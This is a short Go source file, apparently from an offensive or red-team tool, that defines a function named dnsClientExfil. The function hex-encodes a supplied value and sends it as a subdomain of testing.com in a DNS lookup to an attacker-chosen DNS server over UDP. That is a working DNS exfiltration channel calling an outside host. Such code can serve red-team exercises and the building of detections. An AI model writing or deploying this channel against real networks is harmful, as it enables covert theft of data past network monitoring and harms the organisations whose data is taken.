package cmd

import (

	"net"
	"context"
	"time"
)

var (
	hexBytes []byte
)

func dnsClientExfil(fileName, dnsServer, dnsPort string) {
	r := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{
				Timeout: time.Millisecond * time.Duration(10000),
			}
			return d.DialContext(ctx, "udp", dnsServer + ":" + dnsPort)
		},
	}
	record := hexEncode(fileName)
	_, err := r.LookupHost(context.Background(), string(record) + ".testing.com")
	check(err)
	
}